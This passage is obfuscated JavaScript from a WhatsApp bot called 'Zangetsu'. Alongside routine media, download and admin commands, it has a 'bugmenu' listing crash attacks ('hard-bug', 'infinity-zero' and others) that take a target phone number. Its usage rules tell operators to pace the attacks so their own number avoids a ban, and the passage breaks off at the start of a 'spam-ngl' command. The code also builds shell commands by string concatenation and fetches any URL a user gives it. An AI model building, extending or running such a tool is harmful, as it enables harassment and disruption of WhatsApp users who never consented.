+ "𝙩𝙤𝙞𝙢𝙜\n┗❐\n┏❐  *⌜𝐀𝐔𝐃𝐈𝐎 𝐌𝐄𝐍𝐔⌟*  ❐\n┃⭔" + _0x237505 + "𝙗𝙖𝙨𝙨\n┃⭔" + _0x237505 + "𝙗𝙡𝙤𝙬𝙣\n┃⭔" + _0x237505 + "𝙙𝙚𝙚𝙥\n┃⭔" + _0x237505 + "𝙚𝙖𝙧𝙧𝙖𝙥𝙚\n┃⭔" + _0x237505 + "𝙛𝙖𝙨𝙩\n┃⭔" + _0x237505 + "𝙛𝙖𝙩\n┃⭔" + _0x237505 + "𝙣𝙞𝙜𝙝𝙩𝙘𝙤𝙧𝙚\n┃⭔" + _0x237505 + "𝙧𝙚𝙫𝙚𝙧𝙨𝙚\n┃⭔" + _0x237505 + "𝙧𝙤𝙗𝙤𝙩\n┃⭔" + _0x237505 + "𝙨𝙡𝙤𝙬\n┃⭔" + _0x237505 + "𝙨𝙢𝙤𝙤𝙩𝙝\n┃⭔" + _0x237505 + "𝙩𝙪𝙥𝙖𝙞\n┗❐\n┏❐  *⌜𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍⌟*  ❐\n┃⭔" + _0x237505 + "𝙥𝙞𝙣𝙜\n┃⭔" + _0x237505 + "𝙨𝙥𝙚𝙚𝙙𝙩𝙚𝙨𝙩\n┃⭔" + _0x237505 + "𝙙𝙞𝙨𝙠\n┃⭔" + _0x237505 + "𝙩𝙦𝙩𝙤\n┗❐\n┏❐  *⌜𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 𝙈𝙀𝙉𝙐⌟* ❐\n┃⭔" + _0x237505 + "𝙥𝙡𝙖𝙮\n┃⭔" + _0x237505 + "𝙥𝙞𝙣𝙙𝙡\n┃⭔" + _0x237505 + "𝙞𝙜𝙙𝙡\n┃⭔" + _0x237505 + "𝙩𝙞𝙠𝙩𝙤𝙠\n┗❐\n";
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            video: {
              url: "https://files.catbox.moe/5mcofv.mp4"
            },
            caption: _0x552577,
            mimetype: "video/mp4",
            gifPlayback: true,
            contextInfo: {
              mentionedJid: [_0x2b94ac.sender],
              forwardedNewsletterMessageInfo: {
                newsletterName: "𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 𝐈𝐍𝐅𝐎👑",
                newsletterJid: "120363374529648284@newsletter"
              },
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: "© 𝚉𝚊𝚗𝚐𝚎𝚝𝚜𝚞 𝚅𝟷.𝟶",
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: _0x347312,
                sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
              }
            }
          }, {
            quoted: _0x2b94ac
          });
        }
        ;
        break;
      case "bugmenu":
        {
          if (!_0x4c11a5) {
            return;
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          await _0x3a4302(500);
          let _0x212a16 = "\n▀█ █▀▀ ▀█▀ ▀█ █░█\n█▄ █▄█ ░█░ █▄ █▄█\n*「 𝙄𝙉𝙁𝙊-𝘽𝙊𝙏𝙕 」*\n*𝙉𝘼𝙈𝘼 𝘽𝙊𝙏𝙕:* " + global.botname + "\n*𝙑𝙀𝙍𝙎𝙄𝙊𝙉 :* " + global.version + "\n*𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 :* " + global.author + "\n*𝙒𝘼𝙆𝙏𝙐 𝙒𝙄𝘽 :* " + _0x3a2a21 + "\n*𝙈𝙊𝘿𝙀 :* " + (_0x3ac7f7.Public ? "self" : "public") + "      \n「 *`𝘽𝙐𝙂 𝙋𝙊𝙏𝙀𝙉𝙎𝙄𝙊`* 」\n> ボ 𝙚𝙖𝙨𝙮-𝙗𝙪𝙜 <number> \n> ボ 𝙢𝙚𝙙𝙞𝙪𝙢-𝙗𝙪𝙜 <number>\n> ボ 𝙝𝙖𝙧𝙙-𝙗𝙪𝙜 <number>\n> ボ 𝙗𝙧𝙪𝙩𝙖𝙡-𝙜𝙚𝙩𝙨𝙪 <number>\n\n「 *`𝗕𝗨𝗚 𝗭𝗔𝗡𝗚𝗘𝗧𝗦𝗨`* 」\n> ボ 𝗶𝗻𝗳𝗶𝗻𝗶𝘁𝘆-𝘇𝗲𝗿𝗼 <number>\n> ボ 𝙗𝙖𝙣𝙠𝙖𝙞  <number>\n> ボ 𝙗𝙡𝙪𝙩-𝙫𝙚𝙣𝙚  <number>\n> ボ 𝙨𝙤𝙣𝙞𝙙𝙤 <number>\n> ボ 𝗴𝗲𝘁𝘀𝘂𝗴𝗮-𝙩𝙚𝙣𝙨𝙝𝙤  <number>\n> ボ 𝗴𝗲𝘁𝘀𝘂𝗴𝗮-𝙟𝙪𝙟𝙞𝙨𝙝𝙤  <number>\n";
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            video: {
              url: "https://files.catbox.moe/5mcofv.mp4"
            },
            caption: _0x212a16,
            mimetype: "video/mp4",
            gifPlayback: true,
            contextInfo: {
              mentionedJid: [_0x2b94ac.sender],
              forwardedNewsletterMessageInfo: {
                newsletterName: "𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 𝐈𝐍𝐅𝐎👑",
                newsletterJid: "120363374529648284@newsletter"
              },
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: "© 𝚉𝚊𝚗𝚐𝚎𝚝𝚜𝚞 𝚅𝟷.𝟶",
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: _0x347312,
                sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
              }
            }
          }, {
            quoted: _0x2b94ac
          });
        }
        ;
        break;
      case "panduan":
        {
          if (!_0x4c11a5) {
            return;
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "📚",
              key: _0x2b94ac.key
            }
          });
          await _0x3a4302(500);
          let _0x5efe2b = "\n*Hi Kak @" + _0x2b94ac?.sender.split("@")[0] + " 👋*  \n▀█ █▀▀ ▀█▀ ▀█ █░█\n█▄ █▄█ ░█░ █▄ █▄█\n\nHere are the rules for using the Here are the *𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔*.\n\n🇮🇩 *Indonesia :*\n* Manfaatkan Bug dengan Baik.\n* Tidak Untuk Disalah gunakan.\n* Jangan Gunakan Kepada Orang Yang Tidak Bersalah.\n* Hati-hati dalam menggunakan bug Zangetsu, beri jeda beberapa saat agar nomor anda tidak kenon\n* Rekomendasi bug yang Tidak terlalu Brutal adalah ( easy-bug dan Medium-bug ) \n* selalu Support Developer\n* Ikuti Sosial Media Developer\n  https://whatsapp.com/channel/0029VagA7stBVJlASVyGs812\n \n🇬🇧 *English :*\n* Make Good Use of Bugs.\n* Not To Be Misused.\n* Do Not Use On Innocent People.\n* heart in using the zangetsu bug, pause for a while so that your number does not get banned\n* A not too brutal bug recommendation is ( easy-bug and Medium-bug ) \n* Always support developers\n* Follow the developer's social media\n  https://whatsapp.com/channel/0029VagA7stBVJlASVyGs812\n\nⓘ Bee Smart All⛅\n";
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            video: {
              url: "https://files.catbox.moe/5mcofv.mp4"
            },
            caption: _0x5efe2b,
            mimetype: "video/mp4",
            gifPlayback: true,
            contextInfo: {
              mentionedJid: [_0x2b94ac.sender],
              forwardedNewsletterMessageInfo: {
                newsletterName: "𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 𝐈𝐍𝐅𝐎👑",
                newsletterJid: "120363374529648284@newsletter"
              },
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: "© 𝚉𝚊𝚗𝚐𝚎𝚝𝚜𝚞 𝚟𝟷.𝟶",
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: _0x347312,
                sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
              }
            }
          }, {
            quoted: _0x2b94ac
          });
        }
        ;
        break;
      case "bass":
      case "blown":
      case "deep":
      case "earrape":
      case "fast":
      case "fat":
      case "nightcore":
      case "reverse":
      case "robot":
      case "slow":
      case "smooth":
      case "tupai":
        {
          if (!/audio/.test(_0x2d34b9)) {
            return _0x36bf8d("reply to the audio you want to change with the caption *" + (_0x237505 + _0x106ae3) + "*");
          }
          let _0x5b653d;
          if (/bass/.test(_0x106ae3)) {
            _0x5b653d = "-af equalizer=f=54:width_type=o:width=2:g=20";
          }
          if (/blown/.test(_0x106ae3)) {
            _0x5b653d = "-af acrusher=.1:1:64:0:log";
          }
          if (/deep/.test(_0x106ae3)) {
            _0x5b653d = "-af atempo=4/4,asetrate=44500*2/3";
          }
          if (/earrape/.test(_0x106ae3)) {
            _0x5b653d = "-af volume=12";
          }
          if (/fast/.test(_0x106ae3)) {
            _0x5b653d = "-filter:a \"atempo=1.63,asetrate=44100\"";
          }
          if (/fat/.test(_0x106ae3)) {
            _0x5b653d = "-filter:a \"atempo=1.6,asetrate=22100\"";
          }
          if (/nightcore/.test(_0x106ae3)) {
            _0x5b653d = "-filter:a atempo=1.06,asetrate=44100*1.25";
          }
          if (/reverse/.test(_0x106ae3)) {
            _0x5b653d = "-filter_complex \"areverse\"";
          }
          if (/robot/.test(_0x106ae3)) {
            _0x5b653d = "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
          }
          if (/slow/.test(_0x106ae3)) {
            _0x5b653d = "-filter:a \"atempo=0.7,asetrate=44100\"";
          }
          if (/smooth/.test(_0x106ae3)) {
            _0x5b653d = "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
          }
          if (/tupai/.test(_0x106ae3)) {
            _0x5b653d = "-filter:a \"atempo=0.5,asetrate=65100\"";
          }
          if (/audio/.test(_0x2d34b9)) {
            let _0x22b0a2 = await _0x3ac7f7.downloadAndSaveMediaMessage(_0x461c83);
            let _0xbfc297 = _0x4e7d86(".mp3");
            exec("ffmpeg -i " + _0x22b0a2 + " " + _0x5b653d + " " + _0xbfc297, (_0x3a5390, _0xbafe90, _0x54d1fc) => {
              fs.unlinkSync(_0x22b0a2);
              if (_0x3a5390) {
                return _0x36bf8d(_0x3a5390);
              }
              let _0xdb670e = fs.readFileSync(_0xbfc297);
              _0x38179e(_0xdb670e);
              fs.unlinkSync(_0xbfc297);
            });
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(_0x2d34b9)) {
            return _0x36bf8d("reply sticker with caption *" + (_0x237505 + _0x106ae3) + "*");
          }
          let _0x3343a9 = await _0x3ac7f7.downloadAndSaveMediaMessage(_0x461c83);
          let _0xea6dad = await _0x4e7d86(".png");
          exec("ffmpeg -i " + _0x3343a9 + " " + _0xea6dad, _0x14c97d => {
            fs.unlinkSync(_0x3343a9);
            if (_0x14c97d) {
              return _0x14c97d;
            }
            let _0x33f849 = fs.readFileSync(_0xea6dad);
            _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
              image: _0x33f849
            }, {
              quoted: _0x2b94ac
            });
            fs.unlinkSync(_0xea6dad);
          });
        }
        break;
      case "tagme":
        {
          if (!_0x5125fc) {
            return false;
          }
          let _0x421c30 = [_0x2b94ac.sender];
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            text: "@" + _0x51981c,
            mentions: _0x421c30
          });
        }
        break;
      case "addowner":
        {
          if (!_0x42d71f) {
            return _0x36bf8d(mess.owner);
          }
          if (!_0xd19836[0]) {
            return _0x36bf8d("use of " + (_0x237505 + _0x106ae3) + " number, Example " + (_0x237505 + _0x106ae3) + " 628888");
          }
          const _0x16e081 = _0x4e0d9e.split("|")[0].replace(/[^0-9]/g, "");
          const _0x4a8b71 = await _0x3ac7f7.onWhatsApp(_0x16e081 + "@s.whatsapp.net");
          if (_0x4a8b71.length == 0) {
            return _0x36bf8d("enter a valid and registered number on WhatsApp!!!");
          }
          _0x4986a1.push(_0x16e081);
          fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(_0x4986a1));
          _0x36bf8d(_0x16e081 + " already a contributor!!!");
          _0x3ac7f7.sendMessage(_0x16e081 + "@s.whatsapp.net", {
            text: "congratulations, you are now the owner of this bot. "
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "addprem":
        {
          if (!_0x42d71f) {
            return _0x36bf8d(mess.owner);
          }
          if (!_0xd19836[0]) {
            return _0x36bf8d("use of " + (_0x237505 + _0x106ae3) + " number, Example " + (_0x237505 + _0x106ae3) + " 628888");
          }
          const _0x4fd253 = _0x4e0d9e.split("|")[0].replace(/[^0-9]/g, "");
          const _0x4dc203 = await _0x3ac7f7.onWhatsApp(_0x4fd253 + "@s.whatsapp.net");
          if (_0x4dc203.length == 0) {
            return _0x36bf8d("enter a valid and registered number on WhatsApp!!!");
          }
          _0x35f08c.push(_0x4fd253);
          fs.writeFileSync("./start/lib/database/premium.json", JSON.stringify(_0x35f08c));
          _0x36bf8d(_0x4fd253 + " already a contributor!!!");
          _0x3ac7f7.sendMessage(_0x4fd253 + "@s.whatsapp.net", {
            text: "congratulations, you are now the owner of this bot. "
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "delowner":
        {
          if (!_0x42d71f) {
            return _0x36bf8d(mess.owner);
          }
          if (!_0xd19836[0]) {
            return _0x36bf8d("use of " + (_0x237505 + _0x106ae3) + " number, Example " + (_0x237505 + _0x106ae3) + " 628888");
          }
          const _0x48669d = _0x4e0d9e.split("|")[0].replace(/[^0-9]/g, "");
          const _0x521c71 = _0x4986a1.indexOf(_0x48669d);
          if (_0x521c71 !== -1) {
            _0x4986a1.splice(_0x521c71, 1);
            fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(_0x4986a1));
            _0x36bf8d(_0x48669d + " no longer a contributor!!!");
          } else {
            _0x36bf8d(_0x48669d + " not found in contributors list.");
          }
        }
        break;
      case "delprem":
        {
          if (!_0x42d71f) {
            return _0x36bf8d(mess.owner);
          }
          if (!_0xd19836[0]) {
            return _0x36bf8d("use of " + (_0x237505 + _0x106ae3) + " number, Example " + (_0x237505 + _0x106ae3) + " 628888");
          }
          const _0x11ac41 = _0x4e0d9e.split("|")[0].replace(/[^0-9]/g, "");
          const _0x41d572 = _0x35f08c.indexOf(_0x11ac41);
          if (_0x41d572 !== -1) {
            _0x35f08c.splice(_0x41d572, 1);
            fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(_0x35f08c));
            _0x36bf8d(_0x11ac41 + " no longer a contributor!!!");
          } else {
            _0x36bf8d(_0x11ac41 + " not found in contributors list.");
          }
        }
        break;
      case "mode":
        {
          if (!_0x42d71f) {
            return _0x36bf8d("only my owner can access this feature lol 🗣️.");
          }
          const _0x17acc9 = _0xd19836[0];
          if (_0x17acc9 === "public") {
            _0x3ac7f7.public = true;
            _0x36bf8d("_successfully set to *public* mode_");
          } else if (_0x17acc9 === "self") {
            _0x3ac7f7.public = false;
            _0x36bf8d("_successfully set to *self* mode_");
          } else {
            _0x36bf8d("Invalid mode. Use \".mode public\" or \".mode self\".");
          }
        }
        break;
      case "backup":
        {
          if (!_0x42d71f) {
            return _0x36bf8d("Only my owner can access this feature lol 🗣️.");
          }
          const _0x3539f7 = "./session";
          if (fs.existsSync(_0x3539f7)) {
            const _0x14e7c6 = fs.readdirSync(_0x3539f7);
            _0x14e7c6.forEach(_0x2ce0bb => {
              if (_0x2ce0bb !== "creds.json") {
                const _0x56fe6d = path.join(_0x3539f7, _0x2ce0bb);
                if (fs.lstatSync(_0x56fe6d).isDirectory()) {
                  fs.rmSync(_0x56fe6d, {
                    recursive: true,
                    force: true
                  });
                } else {
                  fs.unlinkSync(_0x56fe6d);
                }
              }
            });
          }
          const _0xd063ff = execSync("ls").toString().split("\n").filter(_0x89b66f => _0x89b66f != "node_modules" && _0x89b66f != "package-lock.json" && _0x89b66f != "yarn.lock" && _0x89b66f != "tmp" && _0x89b66f != "");
          execSync("zip -r backup.zip " + _0xd063ff.join(" "));
          await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            document: fs.readFileSync("./backup.zip"),
            fileName: "script.zip",
            mimetype: "audio/mpeg",
            caption: "this is a backup of your script",
            jpegThumbnail: fs.readFileSync("./start/lib/media/tes.png")
          }, {
            quoted: _0x2b94ac
          });
          execSync("rm -rf backup.zip");
        }
        break;
      case "tqto":
        {
          let _0x1257d9 = "selamat kepada pihak-pihak yang telah membantu saya mengembangkan 𝙨𝙘𝙧𝙞𝙥𝙩 𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 ini\n\n> Tuhan Yang Maha Esa\n> Keluarga\n> Para Guru\n> IchigoDEV (Developer)\n> ruzxDev (Support)\n> Alwaysriky DEV (Support) \n> Folowers setia\n> pengguna script\n> Dan semua orang\n\n— Tim yang Berpartisipasi\n> Xrz - Team\n> Tanpa Mereka Script ini Bukanlah Apa-apa :)";
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            text: _0x1257d9,
            contextInfo: {
              mentionedJid: [_0x2b94ac.sender],
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: "© 𝚣𝚊𝚗𝚐𝚎𝚝𝚜𝚞",
                body: "Bot WhatsApp sederhana menggunakan JavaScript untuk merespons perintah secara otomatis.",
                mediaType: 1,
                thumbnailUrl: _0x347312,
                thumbnail: "",
                sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
              }
            }
          }, {
            quoted: _0x2b94ac
          });
        }
        ;
        break;
      case "tourl":
        {
          let _0x49ddc3 = _0x2b94ac.quoted ? _0x2b94ac.quoted : _0x2b94ac;
          let _0x132f6a = await _0x49ddc3.download();
          let _0x261eb8 = require("./lib/uploadImage");
          let _0x4b9cb4 = /image\/(png|jpe?g|gif)|video\/mp4/.test(_0x2d34b9);
          const _0x4bee89 = require("./lib/uploadFile");
          let _0x38caad = await (_0x4b9cb4 ? _0x261eb8 : _0x4bee89)(_0x132f6a);
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            text: "(no expiration date/unknown)\n " + _0x38caad
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "ping":
        {
          const _0x52c4d2 = performance.now();
          const _0x12d328 = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
          const _0x34fe28 = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
          const _0x5d7897 = "server information\n\n> CPU : *" + os.cpus().length + " Core, " + os.cpus()[0].model + "*\n> Uptime : *" + Math.floor(os.uptime() / 86400) + " days*\n> Ram : *" + _0x34fe28 + "/" + _0x12d328 + "*\n> Speed : *" + (performance.now() - _0x52c4d2).toFixed(5) + " ms*";
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            text: _0x5d7897
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "speedtest":
        {
          const _0xe468ee = promisify(cp.exec).bind(cp);
          let _0x59cd97;
          try {
            _0x59cd97 = await _0xe468ee("python3 speed.py --share --secure");
          } catch (_0x2fe93b) {
            _0x59cd97 = _0x2fe93b;
          } finally {
            const {
              stdout: _0x202d5b,
              stderr: _0x40e980
            } = _0x59cd97;
            if (_0x202d5b.trim()) {
              _0x3ac7f7.relayMessage(_0x2b94ac.chat, {
                extendedTextMessage: {
                  text: _0x202d5b,
                  contextInfo: {
                    externalAdReply: {
                      title: "S P E E D  T E S T",
                      mediaType: 1,
                      previewType: 0,
                      renderLargerThumbnail: true,
                      thumbnailUrl: _0x347312,
                      sourceUrl: "https://ichigo.dev.id"
                    }
                  },
                  mentions: [_0x2b94ac.sender]
                }
              }, {
                quoted: _0x2b94ac
              });
            }
            if (_0x40e980.trim()) {
              _0x36bf8d(_0x40e980);
            }
          }
        }
        break;
      case "disk":
        {
          exec("cd && du -h --max-depth=1", (_0x321be9, _0x2a56a6) => {
            if (_0x321be9) {
              return _0x36bf8d("" + _0x321be9);
            }
            if (_0x2a56a6) {
              return _0x36bf8d(_0x2a56a6);
            }
          });
        }
        break;
      case "sticker":
      case "s":
      case "stiker":
        {
          if (!_0x461c83) {
            return _0x36bf8d("Reply image/video dengan caption .s");
          }
          try {
            if (/image/.test(_0x2d34b9)) {
              const _0x50063e = await _0x461c83.download();
              const _0x44d4fa = "data:" + _0x2d34b9 + ";base64," + _0x50063e.toString("base64");
              await _0x51f489(_0x44d4fa, _0x3ac7f7, _0x2b94ac);
            } else if (/video/.test(_0x2d34b9)) {
              if ((_0x461c83?.msg || _0x461c83)?.seconds > 10) {
                return _0x36bf8d("Durasi video maksimal 10 detik!");
              }
              const _0x4aa22f = await _0x461c83.download();
              const _0xcd668b = "data:" + _0x2d34b9 + ";base64," + _0x4aa22f.toString("base64");
              await _0x51f489(_0xcd668b, _0x3ac7f7, _0x2b94ac);
            } else {
              return _0x36bf8d("Kirim gambar/video dengan caption .s (video durasi 1-10 detik)");
            }
          } catch (_0x49cd34) {
            console.error(_0x49cd34);
            return _0x36bf8d("Terjadi kesalahan saat memproses media. Coba lagi.");
          }
        }
        break;
      case "get":
        {
          if (!/^https?:\/\//.test(_0x4e0d9e)) {
            return _0x36bf8d("where is the url? example: " + (_0x237505 + _0x106ae3) + " https://kyuurzy.site");
          }
          const _0x314481 = await fetch(_0x4e0d9e);
          if (_0x314481.headers.get("content-length") > 104857600) {
            throw "Content-Length: " + _0x314481.headers.get("content-length");
          }
          const _0x3cc5d7 = _0x314481.headers.get("content-type");
          if (_0x3cc5d7.startsWith("image/")) {
            return _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
              image: {
                url: _0x4e0d9e
              }
            }, {
              quoted: _0x2b94ac
            });
          }
          if (_0x3cc5d7.startsWith("video/")) {
            return _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
              video: {
                url: _0x4e0d9e
              }
            }, {
              quoted: _0x2b94ac
            });
          }
          if (_0x3cc5d7.startsWith("audio/")) {
            return _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
              audio: {
                url: _0x4e0d9e
              }
            }, {
              quoted: _0x2b94ac
            });
          }
          let _0x500d9e = await _0x314481.buffer();
          try {
            _0x500d9e = util.format(JSON.parse(_0x500d9e + ""));
          } catch (_0x4b6fb9) {
            _0x500d9e = _0x500d9e + "";
          } finally {
            return _0x36bf8d(_0x500d9e.slice(0, 65536));
          }
        }
        break;
      case "totag":
        {
          if (!_0x96bf6f) {
            return _0x36bf8d("only admin can use this command");
          }
          if (!_0x2b94ac.isGroup) {
            return _0x36bf8d("This command can only be used in groups");
          }
          if (!_0x2b94ac.quoted) {
            return _0x36bf8d("reply to message with caption " + (_0x237505 + _0x106ae3));
          }
          const _0x27add9 = await _0x3ac7f7.groupMetadata(_0x2b94ac.chat);
          const _0x2626cf = _0x27add9.participants;
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            forward: _0x2b94ac.quoted.fakeObj,
            mentions: _0x2626cf.map(_0x2947e7 => _0x2947e7.id)
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "igdl":
      case "ig":
        {
          if (!_0x4e0d9e) {
            return _0x36bf8d("Where is the Instagram URL? *Example*: " + (_0x237505 + _0x106ae3) + " https://");
          }
          let _0x2015d5 = await _0x3824da(_0x4e0d9e);
          let _0x321c12 = _0x2015d5.data.url_list;
          if (_0x321c12 && _0x321c12.length > 0) {
            const _0x551f2b = _0x321c12[0];
            try {
              const _0x3704ec = await axios.head(_0x551f2b);
              const _0x410c9e = _0x3704ec.headers["content-type"];
              const _0x355af8 = /image\/.*/.test(_0x410c9e);
              const _0x221b61 = /video\/.*/.test(_0x410c9e);
              if (_0x355af8) {
                await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                  image: {
                    url: _0x551f2b
                  },
                  caption: "Successfully downloaded image from that URL"
                }, {
                  quoted: _0x2b94ac
                });
              } else if (_0x221b61) {
                await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                  video: {
                    url: _0x551f2b
                  },
                  caption: "Successfully downloaded video from that URL"
                }, {
                  quoted: _0x2b94ac
                });
              } else {
                await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                  text: "Unsupported media type received."
                }, {
                  quoted: _0x2b94ac
                });
              }
            } catch (_0x34efe0) {
              console.error("Error fetching media type:", _0x34efe0);
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                text: "Error occurred while retrieving media type."
              }, {
                quoted: _0x2b94ac
              });
            }
          } else {
            await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
              text: "No media found or an error occurred while retrieving media."
            }, {
              quoted: _0x2b94ac
            });
          }
        }
        break;
      case "tiktok":
      case "tt":
        {
          if (!_0x4e0d9e) {
            return _0x36bf8d("Where is the TikTok URL? *Example :* " + (_0x237505 + _0x106ae3) + " https://");
          }
          let _0x5a55ad = await _0x1df09b(_0x4e0d9e);
          if (_0x5a55ad && _0x5a55ad.data && _0x5a55ad.data.data) {
            let _0x2627fe = _0x5a55ad.data.data.images || [];
            let _0xe78db5 = _0x5a55ad.data.data.play;
            let _0x5f3b8c = _0x5a55ad.data.data.music;
            const _0x4105ed = async _0x37ab0c => {
              try {
                const _0x4db28a = await axios.head(_0x37ab0c);
                return _0x4db28a.headers["content-type"];
              } catch (_0x264958) {
                console.error(_0x264958);
                return;
              }
            };
            let _0x4ed6b6 = await _0x4105ed(_0xe78db5);
            if (_0x4ed6b6 && _0x4ed6b6.startsWith("video/")) {
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                video: {
                  url: _0xe78db5
                },
                caption: "Successfully downloaded video from TikTok"
              }, {
                quoted: _0x2b94ac
              });
            } else if (_0x2627fe.length > 0) {
              let _0x32288f = _0x2627fe.length;
              let _0xada351 = _0x32288f * 4;
              let _0x5738ad = "Estimasi waktu pengiriman gambar: " + _0xada351 + " detik.";
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                text: _0x5738ad
              }, {
                quoted: _0x2b94ac
              });
              const _0xbfdf11 = async (_0x56152, _0x5a5af7) => {
                let _0x485899 = "Gambar ke-" + (_0x5a5af7 + 1);
                await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                  image: {
                    url: _0x56152
                  },
                  caption: _0x485899
                }, {
                  quoted: _0x2b94ac
                });
              };
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                audio: {
                  url: _0x5f3b8c
                },
                mimetype: "audio/mpeg"
              }, {
                quoted: _0x2b94ac
              });
              for (let _0x3172b1 = 0; _0x3172b1 < _0x2627fe.length; _0x3172b1++) {
                await _0xbfdf11(_0x2627fe[_0x3172b1], _0x3172b1);
                await new Promise(_0x4a4704 => setTimeout(_0x4a4704, 4000));
              }
            } else {
              console.log("No valid video or images found.");
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                text: "No media found or an error occurred while retrieving media."
              }, {
                quoted: _0x2b94ac
              });
            }
          } else {
            console.error("Error: Invalid response structure", _0x5a55ad);
            await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
              text: "No media found or an error occurred while retrieving media."
            }, {
              quoted: _0x2b94ac
            });
          }
        }
        break;
      case "pindl":
        {
          if (!_0x4e0d9e) {
            return _0x36bf8d("Where is the Pinterest URL? *Example:* " + (_0x237505 + _0x106ae3) + " https://pin.it/1DyLc8cGU");
          }
          let _0x3e18cc = await _0x4787cd(_0x4e0d9e);
          let _0x2ad033 = _0x3e18cc.data.result;
          if (_0x2ad033 && _0x2ad033.data) {
            const _0x4ee613 = _0x2ad033.data;
            const _0x53c359 = _0x4ee613.match(/\.(jpeg|jpg|png|gif)$/i);
            const _0x1d438d = _0x4ee613.match(/\.(mp4|webm|ogg)$/i);
            if (_0x53c359) {
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                image: {
                  url: _0x4ee613
                },
                caption: "Successfully downloaded photo using the Pinterest URL"
              }, {
                quoted: _0x2b94ac
              });
            } else if (_0x1d438d) {
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                video: {
                  url: _0x4ee613
                },
                caption: "Successfully downloaded video using the Pinterest URL"
              }, {
                quoted: _0x2b94ac
              });
            } else {
              await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
                text: "Unsupported media type received."
              }, {
                quoted: _0x2b94ac
              });
            }
          } else {
            await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
              text: "No media found or an error occurred while retrieving media."
            }, {
              quoted: _0x2b94ac
            });
          }
        }
        break;
      case "tagall":
        {
          if (!_0x96bf6f) {
            return _0x36bf8d("only admin can use this command");
          }
          if (!_0x2b94ac.isGroup) {
            return _0x36bf8d("This command can only be used in groups");
          }
          const _0x11eec5 = _0xd19836.join(" ") || "kosong";
          let _0x1a92b1 = "*👥 Tag All*\n*Pesan : " + _0x11eec5 + "*\n\n";
          const _0x21b444 = await _0x3ac7f7.groupMetadata(_0x2b94ac.chat);
          const _0x29fc1e = _0x21b444.participants;
          for (let _0xe57b1b of _0x29fc1e) {
            _0x1a92b1 += "@" + _0xe57b1b.id.split("@")[0] + "\n";
          }
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            text: _0x1a92b1,
            mentions: _0x29fc1e.map(_0x59a206 => _0x59a206.id)
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "spam-ngl":
        {
          if (!_0x4e0d9e) {
            return _0x36bf8d("provide the target and the message to be sent. *Example*: " + (_0x237505 + _0x106ae3) + " kyuurzy|woii");
          }
          let _0x282b55 = _0x4e0d9e.split("|")[0];
          let _0x2d25b2 = _0x4e0d9e.split("|")[1];
